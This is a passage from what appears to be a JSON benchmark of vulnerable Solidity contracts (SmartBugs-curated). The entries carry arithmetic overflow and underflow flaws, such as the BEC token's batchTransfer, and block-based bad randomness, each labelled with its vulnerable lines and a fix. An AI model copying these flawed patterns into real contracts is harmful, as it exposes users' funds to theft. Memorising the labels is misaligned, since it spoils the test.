https://github.com/ethereum/EIPs/issues/20\n */\ncontract ERC20 is ERC20Basic {\n  function allowance(address owner, address spender) public constant returns (uint256);\n  function transferFrom(address from, address to, uint256 value) public returns (bool);\n  function approve(address spender, uint256 value) public returns (bool);\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n\n/**\n * @title Standard ERC20 token\n *\n * @dev Implementation of the basic standard token.\n * @dev https://github.com/ethereum/EIPs/issues/20\n * @dev Based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\n */\ncontract StandardToken is ERC20, BasicToken {\n\n  mapping (address => mapping (address => uint256)) internal allowed;\n\n\n  /**\n   * @dev Transfer tokens from one address to another\n   * @param _from address The address which you want to send tokens from\n   * @param _to address The address which you want to transfer to\n   * @param _value uint256 the amount of tokens to be transferred\n   */\n  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n    require(_to != address(0));\n    require(_value > 0 && _value <= balances[_from]);\n    require(_value <= allowed[_from][msg.sender]);\n\n    balances[_from] = balances[_from].sub(_value);\n    balances[_to] = balances[_to].add(_value);\n    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n    Transfer(_from, _to, _value);\n    return true;\n  }\n\n  /**\n   * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\n   *\n   * Beware that changing an allowance with this method brings the risk that someone may use both the old\n   * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this\n   * race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:\n   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n   * @param _spender The address which will spend the funds.\n   * @param _value The amount of tokens to be spent.\n   */\n  function approve(address _spender, uint256 _value) public returns (bool) {\n    allowed[msg.sender][_spender] = _value;\n    Approval(msg.sender, _spender, _value);\n    return true;\n  }\n\n  /**\n   * @dev Function to check the amount of tokens that an owner allowed to a spender.\n   * @param _owner address The address which owns the funds.\n   * @param _spender address The address which will spend the funds.\n   * @return A uint256 specifying the amount of tokens still available for the spender.\n   */\n  function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n    return allowed[_owner][_spender];\n  }\n}\n\n/**\n * @title Ownable\n * @dev The Ownable contract has an owner address, and provides basic authorization control\n * functions, this simplifies the implementation of \"user permissions\".\n */\ncontract Ownable {\n  address public owner;\n\n\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n\n  /**\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\n   * account.\n   */\n  function Ownable() {\n    owner = msg.sender;\n  }\n\n\n  /**\n   * @dev Throws if called by any account other than the owner.\n   */\n  modifier onlyOwner() {\n    require(msg.sender == owner);\n    _;\n  }\n\n\n  /**\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\n   * @param newOwner The address to transfer ownership to.\n   */\n  function transferOwnership(address newOwner) onlyOwner public {\n    require(newOwner != address(0));\n    OwnershipTransferred(owner, newOwner);\n    owner = newOwner;\n  }\n\n}\n\n/**\n * @title Pausable\n * @dev Base contract which allows children to implement an emergency stop mechanism.\n */\ncontract Pausable is Ownable {\n  event Pause();\n  event Unpause();\n\n  bool public paused = false;\n\n\n  /**\n   * @dev Modifier to make a function callable only when the contract is not paused.\n   */\n  modifier whenNotPaused() {\n    require(!paused);\n    _;\n  }\n\n  /**\n   * @dev Modifier to make a function callable only when the contract is paused.\n   */\n  modifier whenPaused() {\n    require(paused);\n    _;\n  }\n\n  /**\n   * @dev called by the owner to pause, triggers stopped state\n   */\n  function pause() onlyOwner whenNotPaused public {\n    paused = true;\n    Pause();\n  }\n\n  /**\n   * @dev called by the owner to unpause, returns to normal state\n   */\n  function unpause() onlyOwner whenPaused public {\n    paused = false;\n    Unpause();\n  }\n}\n\n/**\n * @title Pausable token\n *\n * @dev StandardToken modified with pausable transfers.\n **/\n\ncontract PausableToken is StandardToken, Pausable {\n\n  function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n    return super.transfer(_to, _value);\n  }\n\n  function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n    return super.transferFrom(_from, _to, _value);\n  }\n\n  function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\n    return super.approve(_spender, _value);\n  }\n\n  function batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) {\n    uint cnt = _receivers.length;\n    // <yes> <report> ARITHMETIC\n    uint256 amount = uint256(cnt) * _value;\n    require(cnt > 0 && cnt <= 20);\n    require(_value > 0 && balances[msg.sender] >= amount);\n\n    balances[msg.sender] = balances[msg.sender].sub(amount);\n    for (uint i = 0; i < cnt; i++) {\n        balances[_receivers[i]] = balances[_receivers[i]].add(_value);\n        Transfer(msg.sender, _receivers[i], _value);\n    }\n    return true;\n  }\n}\n\n/**\n * @title Bec Token\n *\n * @dev Implementation of Bec Token based on the basic standard token.\n */\ncontract BecToken is PausableToken {\n    /**\n    * Public variables of the token\n    * The following variables are OPTIONAL vanities. One does not have to include them.\n    * They allow one to customise the token contract & in no way influences the core functionality.\n    * Some wallets/interfaces might not even bother to look at this information.\n    */\n    string public name = \"BeautyChain\";\n    string public symbol = \"BEC\";\n    string public version = '1.0.0';\n    uint8 public decimals = 18;\n\n    /**\n     * @dev Function to check the amount of tokens that an owner allowed to a spender.\n     */\n    function BecToken() {\n      totalSupply = 7000000000 * (10**(uint256(decimals)));\n      balances[msg.sender] = totalSupply;    // Give the creator all initial tokens\n    }\n\n    function () {\n        //if ether is sent to this address, send it back.\n        revert();\n    }\n}\n",
    "vulnerable_function": "batchTransfer",
    "vulnerable_lines": [
      264
    ],
    "vulnerability_type": "integer_issues",
    "original_category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 4,
    "description": "Integer overflow/underflow vulnerability - arithmetic operations without bounds checking at line(s) 264",
    "fix_description": "Use SafeMath library or Solidity 0.8+ with built-in overflow checks",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/arithmetic/BECToken.sol",
    "pragma": "0.4.16",
    "source_url": "https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101#bectokensol"
  },
  {
    "id": "smartbugs_arithmetic_insecure_transfer",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "insecure_transfer.sol",
    "file_content": "/*\n * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/#front-running-aka-transaction-ordering-dependence\n * @author: consensys\n * @vulnerable_at_lines: 18\n */\n\npragma solidity ^0.4.10;\n\ncontract IntegerOverflowAdd {\n    mapping (address => uint256) public balanceOf;\n\n    // INSECURE\n    function transfer(address _to, uint256 _value) public{\n        /* Check if sender has balance */\n        require(balanceOf[msg.sender] >= _value);\n        balanceOf[msg.sender] -= _value;\n        // <yes> <report> ARITHMETIC\n        balanceOf[_to] += _value;\n}\n\n}\n",
    "vulnerable_function": "transfer",
    "vulnerable_lines": [
      18
    ],
    "vulnerability_type": "integer_issues",
    "original_category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Integer overflow/underflow vulnerability - arithmetic operations without bounds checking at line(s) 18",
    "fix_description": "Use SafeMath library or Solidity 0.8+ with built-in overflow checks",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/arithmetic/insecure_transfer.sol",
    "pragma": "0.4.10",
    "source_url": "https://consensys.github.io/smart-contract-best-practices/known_attacks/#front-running-aka-transaction-ordering-dependence"
  },
  {
    "id": "smartbugs_arithmetic_integer_overflow_1",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "integer_overflow_1.sol",
    "file_content": "/*\n * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/integer_overflow/integer_overflow_1.sol\n * @author: -\n * @vulnerable_at_lines: 14\n */\n\n pragma solidity ^0.4.15;\n\n contract Overflow {\n     uint private sellerBalance=0;\n\n     function add(uint value) returns (bool){\n         // <yes> <report> ARITHMETIC\n         sellerBalance += value; // possible overflow\n\n         // possible auditor assert\n         // assert(sellerBalance >= value);\n     }\n\n  // function safe_add(uint value) returns (bool){\n  //   require(value + sellerBalance >= sellerBalance);\n  // sellerBalance += value;\n  // } \n }\n",
    "vulnerable_function": "add",
    "vulnerable_lines": [
      14
    ],
    "vulnerability_type": "integer_issues",
    "original_category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Integer overflow/underflow vulnerability - arithmetic operations without bounds checking at line(s) 14",
    "fix_description": "Use SafeMath library or Solidity 0.8+ with built-in overflow checks",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/arithmetic/integer_overflow_1.sol",
    "pragma": "0.4.15",
    "source_url": "https://github.com/trailofbits/not-so-smart-contracts/blob/master/integer_overflow/integer_overflow_1.sol"
  },
  {
    "id": "smartbugs_arithmetic_integer_overflow_add",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "integer_overflow_add.sol",
    "file_content": "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite/blob/master/benchmarks/integer_overflow_add.sol\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.19;\n\ncontract IntegerOverflowAdd {\n    uint public count = 1;\n\n    function run(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        count += input;\n    }\n}\n",
    "vulnerable_function": "run",
    "vulnerable_lines": [
      17
    ],
    "vulnerability_type": "integer_issues",
    "original_category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Integer overflow/underflow vulnerability - arithmetic operations without bounds checking at line(s) 17",
    "fix_description": "Use SafeMath library or Solidity 0.8+ with built-in overflow checks",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/arithmetic/integer_overflow_add.sol",
    "pragma": "0.4.19",
    "source_url": "https://github.com/ConsenSys/evm-analyzer-benchmark-suite/blob/master/benchmarks/integer_overflow_add.sol"
  },
  {
    "id": "smartbugs_arithmetic_integer_overflow_benign_1",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "integer_overflow_benign_1.sol",
    "file_content": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_benign_1.sol\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow never escapes function\n\npragma solidity ^0.4.19;\n\ncontract IntegerOverflowBenign1 {\n    uint public count = 1;\n\n    function run(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        uint res = count - input;\n    }\n}\n",
    "vulnerable_function": "run",
    "vulnerable_lines": [
      17
    ],
    "vulnerability_type": "integer_issues",
    "original_category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Integer overflow/underflow vulnerability - arithmetic operations without bounds checking at line(s) 17",
    "fix_description": "Use SafeMath library or Solidity 0.8+ with built-in overflow checks",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/arithmetic/integer_overflow_benign_1.sol",
    "pragma": "0.4.19",
    "source_url": "https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_benign_1.sol"
  },
  {
    "id": "smartbugs_arithmetic_integer_overflow_mapping_sym_1",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "integer_overflow_mapping_sym_1.sol",
    "file_content": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_mapping_sym_1.sol\n * @author: -\n * @vulnerable_at_lines: 16\n */\n\n//Single transaction overflow\n\npragma solidity ^0.4.11;\n\ncontract IntegerOverflowMappingSym1 {\n    mapping(uint256 => uint256) map;\n\n    function init(uint256 k, uint256 v) public {\n        // <yes> <report> ARITHMETIC\n        map[k] -= v;\n    }\n}\n",
    "vulnerable_function": "init",
    "vulnerable_lines": [
      16
    ],
    "vulnerability_type": "integer_issues",
    "original_category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Integer overflow/underflow vulnerability - arithmetic operations without bounds checking at line(s) 16",
    "fix_description": "Use SafeMath library or Solidity 0.8+ with built-in overflow checks",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/arithmetic/integer_overflow_mapping_sym_1.sol",
    "pragma": "0.4.11",
    "source_url": "https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_mapping_sym_1.sol"
  },
  {
    "id": "smartbugs_arithmetic_integer_overflow_minimal",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "integer_overflow_minimal.sol",
    "file_content": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_minimal.sol\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.19;\n\ncontract IntegerOverflowMinimal {\n    uint public count = 1;\n\n    function run(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        count -= input;\n    }\n}\n",
    "vulnerable_function": "run",
    "vulnerable_lines": [
      17
    ],
    "vulnerability_type": "integer_issues",
    "original_category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Integer overflow/underflow vulnerability - arithmetic operations without bounds checking at line(s) 17",
    "fix_description": "Use SafeMath library or Solidity 0.8+ with built-in overflow checks",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/arithmetic/integer_overflow_minimal.sol",
    "pragma": "0.4.19",
    "source_url": "https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_minimal.sol"
  },
  {
    "id": "smartbugs_arithmetic_integer_overflow_mul",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "integer_overflow_mul.sol",
    "file_content": "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_mul.sol\n * @author: -\n * @vulnerable_at_lines: 17\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.19;\n\ncontract IntegerOverflowMul {\n    uint public count = 2;\n\n    function run(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        count *= input;\n    }\n}\n",
    "vulnerable_function": "run",
    "vulnerable_lines": [
      17
    ],
    "vulnerability_type": "integer_issues",
    "original_category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Integer overflow/underflow vulnerability - arithmetic operations without bounds checking at line(s) 17",
    "fix_description": "Use SafeMath library or Solidity 0.8+ with built-in overflow checks",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/arithmetic/integer_overflow_mul.sol",
    "pragma": "0.4.19",
    "source_url": "https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/integer_overflow_and_underflow/integer_overflow_mul.sol"
  },
  {
    "id": "smartbugs_arithmetic_integer_overflow_multitx_multifunc_feasible",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "integer_overflow_multitx_multifunc_feasible.sol",
    "file_content": "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 25\n */\n\n//Multi-transactional, multi-function\n//Arithmetic instruction reachable\n\npragma solidity ^0.4.23;\n\ncontract IntegerOverflowMultiTxMultiFuncFeasible {\n    uint256 private initialized = 0;\n    uint256 public count = 1;\n\n    function init() public {\n        initialized = 1;\n    }\n\n    function run(uint256 input) {\n        if (initialized == 0) {\n            return;\n        }\n        // <yes> <report> ARITHMETIC\n        count -= input;\n    }\n}\n",
    "vulnerable_function": "run",
    "vulnerable_lines": [
      25
    ],
    "vulnerability_type": "integer_issues",
    "original_category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Integer overflow/underflow vulnerability - arithmetic operations without bounds checking at line(s) 25",
    "fix_description": "Use SafeMath library or Solidity 0.8+ with built-in overflow checks",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/arithmetic/integer_overflow_multitx_multifunc_feasible.sol",
    "pragma": "0.4.23",
    "source_url": "https://github.com/ConsenSys/evm-analyzer-benchmark-suite"
  },
  {
    "id": "smartbugs_arithmetic_integer_overflow_multitx_onefunc_feasible",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "integer_overflow_multitx_onefunc_feasible.sol",
    "file_content": "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 22\n */\n\n//Multi-transactional, single function\n//Arithmetic instruction reachable\n\npragma solidity ^0.4.23;\n\ncontract IntegerOverflowMultiTxOneFuncFeasible {\n    uint256 private initialized = 0;\n    uint256 public count = 1;\n\n    function run(uint256 input) public {\n        if (initialized == 0) {\n            initialized = 1;\n            return;\n        }\n        // <yes> <report> ARITHMETIC\n        count -= input;\n    }\n}\n",
    "vulnerable_function": "run",
    "vulnerable_lines": [
      22
    ],
    "vulnerability_type": "integer_issues",
    "original_category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Integer overflow/underflow vulnerability - arithmetic operations without bounds checking at line(s) 22",
    "fix_description": "Use SafeMath library or Solidity 0.8+ with built-in overflow checks",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/arithmetic/integer_overflow_multitx_onefunc_feasible.sol",
    "pragma": "0.4.23",
    "source_url": "https://github.com/ConsenSys/evm-analyzer-benchmark-suite"
  },
  {
    "id": "smartbugs_arithmetic_overflow_simple_add",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "overflow_simple_add.sol",
    "file_content": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101#overflow-simple-addsol\n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity 0.4.25;\n\ncontract Overflow_Add {\n    uint public balance = 1;\n\n    function add(uint256 deposit) public {\n        // <yes> <report> ARITHMETIC\n        balance += deposit;\n    }\n}\n",
    "vulnerable_function": "add",
    "vulnerable_lines": [
      14
    ],
    "vulnerability_type": "integer_issues",
    "original_category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Integer overflow/underflow vulnerability - arithmetic operations without bounds checking at line(s) 14",
    "fix_description": "Use SafeMath library or Solidity 0.8+ with built-in overflow checks",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/arithmetic/overflow_simple_add.sol",
    "pragma": "0.4.25",
    "source_url": "https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101#overflow-simple-addsol"
  },
  {
    "id": "smartbugs_arithmetic_overflow_single_tx",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "overflow_single_tx.sol",
    "file_content": "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 18,24,30,36,42,48\n */\n\n//Single transaction overflow\n//Post-transaction effect: overflow escapes to publicly-readable storage\n\npragma solidity ^0.4.23;\n\ncontract IntegerOverflowSingleTransaction {\n    uint public count = 1;\n\n    // ADD overflow with result stored in state variable.\n    function overflowaddtostate(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        count += input;\n    }\n\n    // MUL overflow with result stored in state variable.\n    function overflowmultostate(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        count *= input;\n    }\n\n    // Underflow with result stored in state variable.\n    function underflowtostate(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        count -= input;\n    }\n\n    // ADD Overflow, no effect on state.\n    function overflowlocalonly(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        uint res = count + input;\n    }\n\n    // MUL Overflow, no effect on state.\n    function overflowmulocalonly(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n        uint res = count * input;\n    }\n\n    // Underflow, no effect on state.\n    function underflowlocalonly(uint256 input) public {\n        // <yes> <report> ARITHMETIC\n       \tuint res = count - input;\n    }\n\n}\n",
    "vulnerable_function": "overflowaddtostate",
    "vulnerable_lines": [
      18
    ],
    "vulnerability_type": "integer_issues",
    "original_category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Integer overflow/underflow vulnerability - arithmetic operations without bounds checking at line(s) 18",
    "fix_description": "Use SafeMath library or Solidity 0.8+ with built-in overflow checks",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/arithmetic/overflow_single_tx.sol",
    "pragma": "0.4.23",
    "source_url": "https://github.com/ConsenSys/evm-analyzer-benchmark-suite"
  },
  {
    "id": "smartbugs_arithmetic_timelock",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "timelock.sol",
    "file_content": "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: -\n * @vulnerable_at_lines: 22\n */\n\n//added pragma version\n pragma solidity ^0.4.10;\n \n contract TimeLock {\n\n     mapping(address => uint) public balances;\n     mapping(address => uint) public lockTime;\n\n     function deposit() public payable {\n         balances[msg.sender] += msg.value;\n         lockTime[msg.sender] = now + 1 weeks;\n     }\n\n     function increaseLockTime(uint _secondsToIncrease) public {\n         // <yes> <report> ARITHMETIC\n         lockTime[msg.sender] += _secondsToIncrease;\n     }\n\n     function withdraw() public {\n         require(balances[msg.sender] > 0);\n         require(now > lockTime[msg.sender]);\n         uint transferValue = balances[msg.sender];\n         balances[msg.sender] = 0;\n         msg.sender.transfer(transferValue);\n     }\n }\n",
    "vulnerable_function": "increaseLockTime",
    "vulnerable_lines": [
      22
    ],
    "vulnerability_type": "integer_issues",
    "original_category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Integer overflow/underflow vulnerability - arithmetic operations without bounds checking at line(s) 22",
    "fix_description": "Use SafeMath library or Solidity 0.8+ with built-in overflow checks",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/arithmetic/timelock.sol",
    "pragma": "0.4.10",
    "source_url": "https://github.com/sigp/solidity-security-blog"
  },
  {
    "id": "smartbugs_arithmetic_token",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "token.sol",
    "file_content": "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: Steve Marx\n * @vulnerable_at_lines: 20,22\n */\n\n pragma solidity ^0.4.18;\n\n contract Token {\n\n   mapping(address => uint) balances;\n   uint public totalSupply;\n\n   function Token(uint _initialSupply) {\n     balances[msg.sender] = totalSupply = _initialSupply;\n   }\n\n   function transfer(address _to, uint _value) public returns (bool) {\n     // <yes> <report> ARITHMETIC\n     require(balances[msg.sender] - _value >= 0);\n     // <yes> <report> ARITHMETIC\n     balances[msg.sender] -= _value;\n     balances[_to] += _value;\n     return true;\n   }\n\n   function balanceOf(address _owner) public constant returns (uint balance) {\n     return balances[_owner];\n   }\n }\n",
    "vulnerable_function": "transfer",
    "vulnerable_lines": [
      20
    ],
    "vulnerability_type": "integer_issues",
    "original_category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Integer overflow/underflow vulnerability - arithmetic operations without bounds checking at line(s) 20",
    "fix_description": "Use SafeMath library or Solidity 0.8+ with built-in overflow checks",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/arithmetic/token.sol",
    "pragma": "0.4.18",
    "source_url": "https://github.com/sigp/solidity-security-blog"
  },
  {
    "id": "smartbugs_arithmetic_tokensalechallenge",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "tokensalechallenge.sol",
    "file_content": "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101 // https://capturetheether.com/challenges/math/token-sale/\n * @author: Steve Marx\n * @vulnerable_at_lines: 23,25,33\n */\n\npragma solidity ^0.4.21;\n\ncontract TokenSaleChallenge {\n    mapping(address => uint256) public balanceOf;\n    uint256 constant PRICE_PER_TOKEN = 1 ether;\n\n    function TokenSaleChallenge(address _player) public payable {\n        require(msg.value == 1 ether);\n    }\n\n    function isComplete() public view returns (bool) {\n        return address(this).balance < 1 ether;\n    }\n\n    function buy(uint256 numTokens) public payable {\n        // <yes> <report> ARITHMETIC\n        require(msg.value == numTokens * PRICE_PER_TOKEN);\n        // <yes> <report> ARITHMETIC\n        balanceOf[msg.sender] += numTokens;\n    }\n\n    function sell(uint256 numTokens) public {\n        require(balanceOf[msg.sender] >= numTokens);\n\n        balanceOf[msg.sender] -= numTokens;\n        // <yes> <report> ARITHMETIC\n        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);\n    }\n}\n",
    "vulnerable_function": "buy",
    "vulnerable_lines": [
      23
    ],
    "vulnerability_type": "integer_issues",
    "original_category": "arithmetic",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Integer overflow/underflow vulnerability - arithmetic operations without bounds checking at line(s) 23",
    "fix_description": "Use SafeMath library or Solidity 0.8+ with built-in overflow checks",
    "is_vulnerable": true,
    "context_level": "single_file",
    "original_source_path": "dataset/arithmetic/tokensalechallenge.sol",
    "pragma": "0.4.21",
    "source_url": "https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-101 // https://capturetheether.com/challenges/math/token-sale/"
  },
  {
    "id": "smartbugs_bad_randomness_blackjack",
    "source_dataset": "smartbugs-curated",
    "language": "solidity",
    "chain": "evm",
    "file_name": "blackjack.sol",
    "file_content": "/*\n * @article: https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620\n * @source: https://etherscan.io/address/0xa65d59708838581520511d98fb8b5d1f76a96cad#code\n * @vulnerable_at_lines: 17,19,21\n * @author: -\n */\n\n pragma solidity ^0.4.9;\n\nlibrary Deck {\n\t// returns random number from 0 to 51\n\t// let's say 'value' % 4 means suit (0 - Hearts, 1 - Spades, 2 - Diamonds, 3 - Clubs)\n\t//\t\t\t 'value' / 4 means: 0 - King, 1 - Ace, 2 - 10 - pip values, 11 - Jacket, 12 - Queen\n\n\tfunction deal(address player, uint8 cardNumber) internal returns (uint8) {\n\t\t// <yes> <report> BAD_RANDOMNESS\n\t\tuint b = block.number;\n\t\t// <yes> <report> BAD_RANDOMNESS\n\t\tuint timestamp = block.timestamp;\n\t\t// <yes> <report> BAD_RANDOMNESS\n\t\treturn uint8(uint256(keccak256(block.blockhash(b), player, cardNumber, timestamp)) % 52);\n\t}\n\n\tfunction valueOf(uint8 card, bool isBigAce) internal constant returns (uint8) {\n\t\tuint8 value = card / 4;\n\t\tif (value == 0 || value == 11 || value == 12) { // Face cards\n\t\t\treturn 10;\n\t\t}\n\t\tif (value == 1 && isBigAce) { // Ace is worth 11\n\t\t\treturn 11;\n\t\t}\n\t\treturn value;\n\t}\n\n\tfunction isAce(uint8 card) internal constant returns (bool) {\n\t\treturn card / 4 == 1;\n\t}\n\n\tfunction isTen(uint8 card) internal constant returns (bool) {\n\t\treturn card / 4 == 10;\n\t}\n}\n\n\ncontract BlackJack {\n\tusing Deck for *;\n\n\tuint public minBet = 50 finney; // 0.05 eth\n\tuint public maxBet = 5 ether;\n\n\tuint8 BLACKJACK = 21;\n\n  enum GameState { Ongoing, Player, Tie, House }\n\n\tstruct Game {\n\t\taddress player; // address \u0438\u0433\u0440\u043e\u043a\u0430\n\t\tuint bet; // \u0441\u0442\u044b\u0432\u043a\u0430\n\n\t\tuint8[] houseCards; // \u043a\u0430\u0440\u0442\u044b \u0434\u0438\u043b\u043b\u0435\u0440\u0430\n\t\tuint8[] playerCards; // \u043a\u0430\u0440\u0442\u044b \u0438\u0433\u0440\u043e\u043a\u0430\n\n\t\tGameState state; // \u0441\u043e\u0441\u0442\u043e\u044f\u043d\u0438\u0435\n\t\tuint8 cardsDealt;\n\t}\n\n\tmapping (address => Game) public games;\n\n\tmodifier gameIsGoingOn() {\n\t\tif (games[msg.sender].player == 0 || games[msg.sender].state != GameState.Ongoing) {\n\t\t\tthrow; // game doesn't exist or already finished\n\t\t}\n\t\t_;\n\t}\n\n\tevent Deal(\n        bool isUser,\n        uint8 _card\n    );\n\n    event GameStatus(\n    \tuint8 houseScore,\n    \tuint8 houseScoreBig,\n    \tuint8 playerScore,\n    \tuint8 playerScoreBig\n    );\n\n    event Log(\n    \tuint8 value\n    );\n\n\tfunction BlackJack() {\n\n\t}\n\n\tfunction () payable {\n\n\t}\n\n\t// starts a new game\n\tfunction deal() public payable {\n\t\tif (games[msg.sender].player != 0 && games[msg.sender].state == GameState.Ongoing) {\n\t\t\tthrow; // game is already going on\n\t\t}\n\n\t\tif (msg.value < minBet || msg.value > maxBet) {\n\t\t\tthrow; // incorrect bet\n\t\t}\n\n\t\tuint8[] memory houseCards = new uint8[](1);\n\t\tuint8[] memory playerCards = new uint8[](2);\n\n\t\t// deal the cards\n\t\tplayerCards[0] = Deck.deal(msg.sender, 0);\n\t\tDeal(true, playerCards[0]);\n\t\thouseCards[0] = Deck.deal(msg.sender, 1);\n\t\tDeal(false, houseCards[0]);\n\t\tplayerCards[1] = Deck.deal(msg.sender, 2);\n\t\tDeal(true, playerCards[1]);\n\n\t\tgames[msg.sender] = Game({\n\t\t\tplayer: msg.sender,\n\t\t\tbet: msg.value,\n\t\t\thouseCards: houseCards,\n\t\t\tplayerCards: playerCards,\n\t\t\tstate: 